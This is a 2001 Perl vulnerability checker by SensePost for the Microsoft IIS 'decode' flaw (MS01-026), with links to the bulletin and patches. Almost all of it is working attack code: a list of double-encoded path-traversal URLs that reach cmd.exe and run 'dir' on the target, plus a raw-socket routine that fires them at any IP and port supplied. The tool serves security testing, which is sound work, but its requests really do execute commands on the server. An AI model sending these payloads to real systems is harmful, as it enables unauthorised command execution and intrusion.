#!/usr/bin/perl
# Very simple PERL script to test an IIS server for "decode" vulnerability. 
# Use port number with SSLproxy for testing SSL sites
# Usage: decodecheck IP:port
#
# Roelof Temmingh 2001/05/15
# roelof@sensepost.com http://www.sensepost.com
#
# Found by NSFOCUS Security Team 2001.05.15
# The bulletin is live at :
# http://www.microsoft.com/technet/security/bulletin/MS01-026.asp
# Patches are available at:
# Microsoft IIS 4.0:
# http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787
# Microsoft IIS 5.0:
# http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764


$|=1;
@unis=(
"/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir",
"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir ",
"/_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir",
"/iisadmpwd/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir",
"/cgi-bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir",
"/samples/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir",
"/_vti_cnf/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir",
"/adsamples/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir");

use Socket;
# --------------init
if ($#ARGV<0) {die "Usage: decodecheck IP:port\n";}
($host,$port)=split(/:/,@ARGV[0]);
print "Testing $host:$port : ";
$target = inet_aton($host);
$flag=0;

foreach $uni (@unis){
 print ".";
 my @results=sendraw("GET $uni HTTP/1.0\r\n\r\n");
 foreach $line (@results){
  if ($line =~ /Directory/) {print "Not safe:\n $uni\n"; $flag=1;}
 }
}

# ---------------result
if ($flag==1){print "Vulnerable\n";}
else {print "Safe\n";}
# ------------- Sendraw - thanx RFP rfp@wiretrip.net
sub sendraw {   # this saves the whole transaction anyway
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect...\n"); }
}
# Spidermark: sensepostdata decodecheck


